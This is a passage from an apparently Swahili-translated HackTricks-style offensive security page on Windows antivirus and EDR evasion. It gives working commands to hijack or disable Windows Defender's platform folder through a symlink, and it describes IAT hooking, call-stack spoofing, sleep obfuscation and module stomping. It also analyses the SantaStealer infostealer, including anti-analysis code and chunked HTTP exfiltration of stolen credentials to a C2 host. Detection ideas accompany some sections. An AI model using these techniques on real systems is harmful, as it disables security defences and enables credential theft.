- Defender huzuia writes ndani ya folders zake, lakini platform selection yake huamini directory entries na huchagua highest version kwa lexicographic bila kuthibitisha kwamba target inaresolve kuwa protected/trusted path.

Hatua kwa hatua (mfano)
1) Tayarisha clone inayoweza kuandikwa ya current platform folder, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Tengeneza symlink ya saraka ya toleo la juu ndani ya Platform ikielekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyogeuzwa:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuangalia njia mpya ya mchakato chini ya `C:\TMP\AV\` na usanidi wa huduma/registry unaoonyesha eneo hilo.

Chaguo za post-exploitation
- DLL sideloading/code execution: Weka/badilisha DLL ambazo Defender hupakia kutoka saraka ya programu yake ili kutekeleza code ndani ya michakato ya Defender. Tazama sehemu iliyo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili kwenye kuanza tena kunakoofuata njia iliyosanidiwa isireference, na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba mbinu hii haitoi privilege escalation peke yake; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant hadi kwenye target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza APIs zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii inapanua evasion zaidi ya API surface ndogo ambayo kits nyingi hutoa (kwa mfano, CreateProcessA), na huongeza protections zilezile kwa BOFs na post‑exploitation DLLs.

High-level approach
- Stage PIC blob pembeni ya target module kwa kutumia reflective loader (prepended au companion). PIC lazima iwe self-contained na position‑independent.
- Wakati host DLL inapopakiwa, pitia IMAGE_IMPORT_DESCRIPTOR yake na u-patch IAT entries za imports zilizolengwa (kwa mfano, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ziweze kuelekeza kwenye thin PIC wrappers.
- Kila PIC wrapper hutekeleza evasions kabla ya ku-tail-call real API address. Evasions za kawaida ni pamoja na:
- Memory mask/unmask around the call (kwa mfano, encrypt beacon regions, RWX→RX, badilisha page names/permissions) kisha rudisha baada ya call.
- Call-stack spoofing: tengeneza benign stack na uingie kwenye target API ili call-stack analysis itatambua expected frames.
- Kwa compatibility, export interface ili Aggressor script (au sawa na hiyo) iweze kusajili APIs zipi za ku-hook kwa Beacon, BOFs na post-ex DLLs.

Why IAT hooking here
- Inafanya kazi kwa code yoyote inayotumia hooked import, bila kubadilisha tool code au kutegemea Beacon proxy APIs maalum.
- Inafunika post-ex DLLs: hooking LoadLibrary* hukuruhusu ku-intercept module loads (kwa mfano, System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion ileile kwa API calls zao.
- Inarejesha matumizi ya kuaminika ya process-spawning post-ex commands dhidi ya call-stack–based detections kwa ku-wrap CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Maelezo
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr zinaonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ziwe ndogo sana na PIC-safe; solve true API kupitia original IAT value uliyoikamata kabla ya patching au kupitia LdrGetProcedureAddress.
- Tumia RW → RX transitions kwa PIC na epuka kuacha kurasa zenye writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs hujenga fake call chain (return addresses ndani ya benign modules) kisha hupivot kwenda kwenye real API.
- Hii hushinda detections zinazotarajia canonical stacks kutoka Beacon/BOFs kwenda sensitive APIs.
- Changanya na stack cutting/stack stitching techniques ili kutua ndani ya expected frames kabla ya API prologue.

Operational integration
- Weka reflective loader kabla ya post-ex DLLs ili PIC na hooks zianze moja kwa moja DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike kwa njia ileile ya evasion bila code changes.

Detection/DFIR considerations
- IAT integrity: entries zinazotatua kwenda non-image (heap/anon) addresses; verification ya mara kwa mara ya import pointers.
- Stack anomalies: return addresses zisizomilikiwa na loaded images; abrupt transitions kwenda non-image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes to IAT, early DllMain activity inayobadilisha import thunks, unexpected RX regions zilizoundwa wakati wa load.
- Image-load evasion: ukihook LoadLibrary*, monitor suspicious loads za automation/clr assemblies zinazoambatana na memory masking events.

Related building blocks and examples
- Reflective loaders zinazofanya IAT patching wakati wa load (k.m., TitanLdr, AceLdr)
- Memory masking hooks (k.m., simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (k.m., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Ukidhibiti reflective loader, unaweza hook imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na custom resolver inayokagua hooks kwanza:

- Tengeneza **resident PICO** (persistent PIC object) inayodumu baada ya transient loader PIC kujifuta yenyewe.
- Export function `setup_hooks()` inayofuta/kuandika upya loader's import resolver (k.m., `funcs.GetProcAddress = _GetProcAddress`).
- Ndani ya `_GetProcAddress`, ruka ordinal imports na tumia hash-based hook lookup kama `__resolve_hook(ror13hash(name))`. Iwapo hook ipo, irudishe; la sivyo, pitisha kwenye real `GetProcAddress`.
- Sajili hook targets wakati wa link time kwa Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook hubaki valid kwa sababu inaishi ndani ya resident PICO.

Hii hutoa **import-time IAT redirection** bila patching ya code section ya DLL iliyopakiwa baada ya load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks huanza tu ikiwa function ipo kweli kwenye IAT ya target. Ikiwa module inaresolve APIs kupitia PEB-walk + hash (hakuna import entry), forcing a real import ili loader's `ProcessImports()` path iione:

- Badilisha hashed export resolution (k.m., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na direct reference kama `&WaitForSingleObject`.
- Compiler hutengeneza IAT entry, ikiwezesha interception wakati reflective loader inaresolve imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Badala ya patching `Sleep`, hook **actual wait/IPC primitives** ambazo implant hutumia (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, funika call ndani ya Ekko-style obfuscation chain inayosimba image iliyoko memory wakati wa idle:

- Tumia `CreateTimerQueueTimer` kuratibu mlolongo wa callbacks unaoitisha `NtContinue` na crafted `CONTEXT` frames.
- Mlolongo wa kawaida (x64): weka image kuwa `PAGE_READWRITE` → RC4 encrypt kupitia `advapi32!SystemFunction032` juu ya full mapped image → fanya blocking wait → RC4 decrypt → **restore per-section permissions** kwa kupitia PE sections → signal completion.
- `RtlCaptureContext` hutoa template `CONTEXT`; i-clone kwenye frames kadhaa na weka registers (`Rip/Rcx/Rdx/R8/R9`) ili kuendesha kila hatua.

Operational detail: rudisha “success” kwa waits ndefu (k.m., `WAIT_OBJECT_0`) ili caller iendelee wakati image ime-mask. Pattern hii huficha module kutoka scanners wakati wa idle windows na huepuka signature ya classic “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Bursts za `CreateTimerQueueTimer` callbacks zinazoelekeza kwa `NtContinue`.
- `advapi32!SystemFunction032` ikitumika kwenye large contiguous image-sized buffers.
- Large-range `VirtualProtect` ikifuatiwa na custom per-section permission restoration.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka kwenye **`.text` section ya DLL ambayo tayari ime-mapped ndani ya target process** badala ya kutenga obvious private executable memory au kupakia fresh sacrificial DLL. The overwrite target should be a **loaded, disk-backed image** whose code space can absorb the payload without corrupting code paths the process still needs.

### Reliable target selection

Naive stomping dhidi ya common modules kama `uxtheme.dll` au `comctl32.dll` ni fragile: DLL huenda isiwe loaded kwenye remote process, na code region ndogo sana itasababisha process crash. Workflow yenye uaminifu zaidi ni:

1. Enumerate target process modules na weka **names-only include list** ya DLLs ambazo tayari zime-loaded.
2. Build payload kwanza na rekodi **exact byte size** yake.
3. Scan candidate DLLs on disk na linganisha PE section **`.text` `Misc_VirtualSize`** dhidi ya payload size. Hili ni muhimu kuliko file size kwa sababu linaonyesha ukubwa wa executable section **inapopakiwa kwenye memory**.
4. Parse **Export Address Table (EAT)** na chagua exported function RVA kama stomp start offset.
5. Hesabu **blast radius**: ikiwa payload inazidi selected function boundary, ita-overwrite adjacent exports zilizoandaliwa baada yake kwenye memory.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Pendekeza DLLs **tayari zimepakuliwa** katika remote process ili kuepuka telemetry ya `LoadLibrary`/unexpected image loads.
- Pendekeza exports ambazo mara chache huendeshwa na target application, vinginevyo normal code paths zinaweza kugonga stomped bytes kabla au baada ya thread creation.
- Large implants mara nyingi huhitaji kubadilisha shellcode embedding kutoka string literal kwenda **byte-array/braced initializer** ili full buffer iwakilishwe kwa usahihi kwenye injector source.

Detection ideas
- Remote writes ndani ya **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya zaidi ya kawaida private RWX/RX allocations.
- Export entry points whose in-memory bytes hazilingani tena na backing file kwenye disk.
- Remote threads au context pivots zinazoanza execution ndani ya legitimate DLL export whose first bytes were recently modified.
- Suspicious `VirtualProtect(Ex)` / `WriteProcessMemory` sequences dhidi ya DLL `.text` pages ikifuatiwa na thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) inaonyesha jinsi modern info-stealers huchanganya AV bypass, anti-analysis na credential access katika workflow moja.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) huhesabu installed keyboard layouts kupitia `GetKeyboardLayoutList`. Ikiwa Cyrillic layout inapatikana, sample huacha empty `CIS` marker na kumaliza kabla ya kuendesha stealers, kuhakikisha haijalipuki kamwe kwenye excluded locales huku ikiacha hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mantiki ya `check_antivm` yenye tabaka

- Toleo A hupitia orodha ya michakato, huhesabu kila jina kwa kutumia custom rolling checksum, na kulilinganisha dhidi ya embedded blocklists za debuggers/sandboxes; hurudia checksum juu ya jina la kompyuta na hukagua working directories kama `C:\analysis`.
- Toleo B hukagua system properties (process-count floor, recent uptime), huita `OpenServiceA("VBoxGuest")` kutambua VirtualBox additions, na hufanya timing checks kuzunguka sleeps ili kugundua single-stepping. Ukigundua lolote, huzuia kabla modules hazijazinduliwa.

### Fileless helper + double ChaCha20 reflective loading

- DLL/EXE ya msingi huembed Chromium credential helper ambayo ama huachwa kwenye disk au hu-manuual map ndani ya memory; fileless mode hu-resolve imports/relocations yake yenyewe ili hakuna helper artifacts zinazoandikwa.
- Helper hiyo huhifadhi second-stage DLL iliyosimbwa mara mbili kwa ChaCha20 (two 32-byte keys + 12-byte nonces). Baada ya passes zote mbili, hui-load reflectively blob (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing kuingiza ndani ya browser hai ya Chromium, kurithi AppBound Encryption keys, na kusimbua passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya hardening ya ABE.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` hupitia global `memory_generators` function-pointer table na huanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Kila thread huandika matokeo ndani ya shared buffers na kuripoti file count yake baada ya ~45s join window.
- Ukimaliza, kila kitu hu-zipiwa kwa static linked `miniz` library kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` hulala kwa 15s na kusafirisha archive kwa 10 MB chunks kupitia HTTP POST kwenda `http://<C2>:6767/upload`, ikispoof browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila chunk huongeza `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, na chunk ya mwisho huongeza `complete: true` ili C2 ijue reassembly imekamilika.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
